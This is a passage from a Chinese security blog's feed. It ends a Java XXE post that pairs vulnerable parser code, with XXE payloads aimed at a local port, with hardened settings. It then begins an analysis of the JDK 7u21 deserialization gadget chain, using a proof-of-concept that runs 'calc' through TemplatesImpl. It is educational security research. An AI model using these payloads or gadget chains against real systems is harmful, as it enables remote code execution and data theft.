class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">reader.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">reader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">reader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">reader.parse(<span class="keyword">new</span> InputSource(is));</span><br></pre></td></tr></table></figure><h3 id="0x07-SchemaFactory"><a href="#0x07-SchemaFactory" class="headerlink" title="0x07.SchemaFactory"></a>0x07.SchemaFactory</h3><p>java组件：javax.xml.validation.SchemaFactory</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SchemaFactory factory = SchemaFactory.newInstance(<span class="string">"http://www.w3.org/2001/XMLSchema"</span>);</span><br><span class="line">    StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">    Schema schema = factory.newSchema(source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SchemaFactory factory = SchemaFactory.newInstance(<span class="string">"http://www.w3.org/2001/XMLSchema"</span>);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">""</span>);</span><br><span class="line">StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">Schema schema = factory.newSchema(source);</span><br></pre></td></tr></table></figure><h3 id="0x08-XMLInputFactory"><a href="#0x08-XMLInputFactory" class="headerlink" title="0x08.XMLInputFactory"></a>0x08.XMLInputFactory</h3><p>java组件：javax.xml.stream.XMLInputFactory</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();</span><br><span class="line">    XMLStreamReader reader = xmlInputFactory.createXMLStreamReader(ResourceUtils.getPoc1());</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (reader.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">int</span> type = reader.next();</span><br><span class="line">            <span class="keyword">if</span> (type == XMLStreamConstants.START_ELEMENT) &#123;<span class="comment">//开始节点</span></span><br><span class="line">            System.out.print(reader.getName());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == XMLStreamConstants.CHARACTERS) &#123;<span class="comment">//表示事件字符</span></span><br><span class="line">            System.out.println(<span class="string">"type"</span> + type);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == XMLStreamConstants.END_ELEMENT) &#123;<span class="comment">//结束节点</span></span><br><span class="line">            System.out.println(reader.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        reader.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();</span><br><span class="line">xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="keyword">false</span>); </span><br><span class="line">xmlInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, <span class="keyword">false</span>);</span><br><span class="line">XMLStreamReader reader = xmlInputFactory.createXMLStreamReader(ResourceUtils.getPoc1());</span><br></pre></td></tr></table></figure><h3 id="0x09-TransformerFactory"><a href="#0x09-TransformerFactory" class="headerlink" title="0x09.TransformerFactory"></a>0x09.TransformerFactory</h3><p>java组件：javax.xml.transform.TransformerFactory</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    TransformerFactory tf = TransformerFactory.newInstance();</span><br><span class="line">    StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">    tf.newTransformer().transform(source, <span class="keyword">new</span> DOMResult());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TransformerFactory tf = TransformerFactory.newInstance();</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">""</span>);</span><br><span class="line">StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">tf.newTransformer().transform(source, <span class="keyword">new</span> DOMResult());</span><br></pre></td></tr></table></figure><h3 id="0x10-Validator"><a href="#0x10-Validator" class="headerlink" title="0x10.Validator"></a>0x10.Validator</h3><p>java组件：javax.xml.validation.*</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SchemaFactory factory = SchemaFactory.newInstance(<span class="string">"http://www.w3.org/2001/XMLSchema"</span>);</span><br><span class="line">    Schema schema = factory.newSchema();</span><br><span class="line">    Validator validator = schema.newValidator();</span><br><span class="line">    StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">    validator.validate(source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Schema schema = factory.newSchema();</span><br><span class="line">Validator validator = schema.newValidator();</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">""</span>);</span><br><span class="line">StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">validator.validate(source);</span><br></pre></td></tr></table></figure><h3 id="0x11-Unmarshaller"><a href="#0x11-Unmarshaller" class="headerlink" title="0x11.Unmarshaller"></a>0x11.Unmarshaller</h3><p>java组件：javax.xml.bind.JAXBContext / javax.xml.bind.Unmarshaller</p><blockquote><p>需要指出：这个组件在jdk1.8默认不存在漏洞，在JDK1.6，1.7默认存在漏洞。<a href="https://anquan.baidu.com/article/315" target="_blank" rel="noopener">参考</a></p></blockquote><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">xmlToObjectXXE</span><span class="params">(String xml, Class&lt;?&gt; klass)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">JAXBContext context = JAXBContext.newInstance(klass);</span><br><span class="line">Unmarshaller unmarshaller = context.createUnmarshaller();</span><br><span class="line"><span class="keyword">return</span> unmarshaller.unmarshal(<span class="keyword">new</span> StringReader(xml));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">xmlToObjectSafe</span><span class="params">(String xml, Class&lt;?&gt; klass)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">JAXBContext context = JAXBContext.newInstance(klass);</span><br><span class="line"></span><br><span class="line">XMLInputFactory xif = XMLInputFactory.newFactory();</span><br><span class="line">xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, <span class="keyword">false</span>);</span><br><span class="line">xif.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="keyword">true</span>);</span><br><span class="line">XMLStreamReader xsr = xif.createXMLStreamReader(<span class="keyword">new</span> StringReader(xml));</span><br><span class="line"></span><br><span class="line">Unmarshaller unmarshaller = context.createUnmarshaller();</span><br><span class="line"><span class="keyword">return</span> unmarshaller.unmarshal(xsr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当<strong>IS_SUPPORTING_EXTERNAL_ENTITIES</strong>为false时，外部实体不会被执行解析<br>当<strong>SUPPORT_DTD</strong>进一步为false时，引入DTD会导致报错。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.w3school.com.cn/xml/index.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/xml/index.asp</a></p><p><a href="https://xz.aliyun.com/t/6829#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/6829#toc-4</a></p><p><a href="http://www.lmxspace.com/2019/10/31/Java-XXE-总结/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/10/31/Java-XXE-总结/</a></p><p><a href="https://anquan.baidu.com/article/315" target="_blank" rel="noopener">https://anquan.baidu.com/article/315</a></p><p><a href="http://rickgray.me/2015/06/08/xml-entity-attack-review/" target="_blank" rel="noopener">http://rickgray.me/2015/06/08/xml-entity-attack-review/</a></p><p><a href="https://xz.aliyun.com/t/3357#toc-15" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-15</a></p><p><a href="https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/" target="_blank" rel="noopener">https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/</a></p><p><a href="https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html" target="_blank" rel="noopener">https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html</a></p><p><a href="https://github.com/GoSecure/dtd-finder" target="_blank" rel="noopener">https://github.com/GoSecure/dtd-finder</a></p><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank" rel="noopener">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近先知上看了篇XXE总结的文章，内容不错。整理了一下以前做的笔记复习一下，合成一篇来水一篇。&lt;/p&gt;
&lt;p&gt;XML这东西payload感觉
      
    
    </summary>
    
    
      <category term="web" scheme="http://lalajun.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>JDK反序列化Gadget 7u21</title>
    <link href="http://lalajun.com/2019/11/30/JDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets%207u21/"/>
    <id>http://lalajun.com/2019/11/30/JDK反序列化Gadgets 7u21/</id>
    <published>2019-11-30T15:05:28.000Z</published>
    <updated>2019-12-12T08:07:39.560Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JDK反序列化Gadgets-7u21"><a href="#JDK反序列化Gadgets-7u21" class="headerlink" title="JDK反序列化Gadgets 7u21"></a>JDK反序列化Gadgets 7u21</h2><p>预计阅读时间：30-60分钟<br>内容：具详细无比</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从fastjson1.24版本的反序列化利用方式知道有使用jdk7u21的版本利用链，ysoserial利用工具中也有7u21利用链。现在都是7u80版本了，这个漏洞真正直接利用，估计已经很难找到了。</p><p>但是这个利用链的构造有很多之前没接触过的java特性，就此好好学习一下，也算是fastjson的前置知识吧。</p><blockquote><p>Gadgets 是啥意思？<br>其实就是利用链的意思</p></blockquote><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>先去Oracle官网下载<a href="https://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html" target="_blank" rel="noopener">漏洞jdk版本7u21</a>，漏洞影响7u25之前的版本，整条链poc貌似只适用于7u21以前。</p><p>之所以说这是JDK反序列化链，是因为这个链中所有利用类都是jdk自带的类，其中payload最终关键类是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类</code>。</p><p>我们从ysoserial源码中抠出7u21的利用代码来分析，具体代码由于比较长，不全部在此贴出，只截取需要的部分，所有代码已上传<a href="https://github.com/lalajun/jdk7u21" target="_blank" rel="noopener">github</a>。</p><p><code>jdk7u21.java</code>是一个包含基础核心原理POC。（Gadgets类参考github，或者可以去ysoserial中取）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">       TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(<span class="string">"calc"</span>);<span class="comment">//生成恶意的calc</span></span><br><span class="line">       calc.getOutputProperties();<span class="comment">//调用getOutputProperties就可以执行calc</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><blockquote><p>请注意TemplatesImpl类的getOutputProperties函数是一个以get开头的函数，这是这个利用链在fastjson组件利用的关键。</p></blockquote><p>跟踪getOutputProperties方法，来确认恶意TemplatesImpl类calc 需要的条件，先看调用栈：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9wr99ulj30yp075aat.jpg" alt="调用栈1.png"></p><h3 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h3><p>从调用栈中，可见最后是<code>obj.newInstance</code>（obj是虚指）触发poc执行恶意代码，调用栈再往下之后就是java class类的newInsatance内部实现了，不细纠。</p><p>newinstance实例化会默认触发执行static方法，构造方法代码，如下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9x8pbn7j31pt0n040u.jpg" alt="newInstance.png"></p><p>所以我们的payload需要放在最后执行的恶意类的static或构造方法中。知道这点后，我们从头开始慢慢寻找其他需要条件。</p><p>跟入<code>TemplatesImpl类</code>的<code>getOutputProperties方法</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();<span class="comment">//我们进入newTransformer方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer方法</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);<span class="comment">//此处没有啥限制条件，进入getTransletInstance()</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">            transformer.setURIResolver(_uriResolver);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">            transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//限制条件1：TemplatesImpl类中的_name变量！=null</span></span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">   <span class="comment">//限制条件2：TemplatesImpl类中的_class变量==null</span></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();<span class="comment">//进入此处，查看其他限制条件</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 漏洞触发代码就是下面这一行，_transletIndex是在defineTransletClasses()中赋值的，其实就是选取了一个特定条件的class获取它的实例。</span></span><br><span class="line">            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            ...<span class="comment">//这里之后的代码不重要，省略</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在漏洞代码执行<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>前，</p><p>先经过<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"><span class="comment">//限制条件3：TemplatesImpl类中的_bytecodes变量！=null</span></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//引入加载器</span></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> </span><br><span class="line"> <span class="comment">//限制条件4：TemplatesImpl类中的_tfactory变量需要有一个getExternalExtensionsMap方法</span></span><br><span class="line">        <span class="comment">//           即需要是一个TransformerFactoryImpl类</span></span><br><span class="line">   TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//以下主要做的事情是通过加载器从_bytecodes中加载类至_class。（bytecodes可以是一个数组转换为一个数组class）</span></span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                <span class="comment">//转化。ClassLoader.defineClass() 会转载javabyte变为class类，但是不会执行static代码。</span></span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="comment">//获取转过来的class的父类</span></span><br><span class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 对于读取进来的class的父类进行限制，满足条件才改变_transletIndex的值</span></span><br><span class="line"> <span class="comment">// 之后将获取class[_transletIndex]的实例</span></span><br><span class="line"> <span class="comment">// ABSTRACT_TRANSLET="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";</span></span><br><span class="line"> <span class="comment">// 限制条件5：_bytecodes的类必须是ABSTRACT_TRANSLET的子类</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="tfactory-与jdk版本"><a href="#tfactory-与jdk版本" class="headerlink" title="_tfactory 与jdk版本"></a>_tfactory 与jdk版本</h3><p>其中的限制条件4 _tfactory 这个参数是有说法的，在其他人博客中有存在对于 _tfactory 的参数的说明：</p><blockquote><p>因为代码中存在  <code>_tfactory.getExternalExtensionsMap()</code> 所以需要 _tfactory 进行赋值 